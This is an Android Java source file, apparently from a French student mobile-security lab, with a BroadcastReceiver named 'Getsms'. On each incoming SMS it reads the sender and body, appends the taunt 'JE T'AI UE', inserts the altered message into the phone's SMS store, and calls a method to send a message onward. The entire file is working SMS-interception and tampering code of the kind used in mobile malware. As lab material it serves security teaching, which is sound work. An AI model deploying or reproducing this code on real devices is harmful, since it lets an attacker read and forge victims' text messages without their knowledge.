package com.dev.christopher.tpsecumobile;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

/**
 * Created by Christopher on 09/12/2015.
 */
public class Getsms extends BroadcastReceiver {
    final SmsManager sms = SmsManager.getDefault();

    MainActivity mainActivity = new MainActivity();

    String string = "JE T'AI UE";
    String smsBody;

    public static final String SMS_BUNDLE = "pdus";
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle intentExtras = intent.getExtras();
        if (intentExtras != null) {
            Object[] sms = (Object[]) intentExtras.get(SMS_BUNDLE);
            String smsMessageStr = "";

            for (int i = 0; i < sms.length; ++i) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) sms[i]);

                smsBody = smsMessage.getMessageBody().toString();
                String address = smsMessage.getOriginatingAddress();

                smsMessageStr += "SMS From: " + address + "\n";
                smsMessageStr += smsBody + "\n";
                smsMessageStr += string+ "\n";
                ContentResolver cnt = context.getContentResolver();

                ContentValues values = new ContentValues();
                values.put("body",smsBody+string);

                cnt.insert(Uri.parse("content://sms"), values);

                mainActivity.getInstance().sendMessage(cnt,smsMessage, string);
            }
            Toast.makeText(context, smsBody + " " + string, Toast.LENGTH_SHORT).show();


            mainActivity.getInstance().updateTextView(smsMessageStr);




        }
    }
}
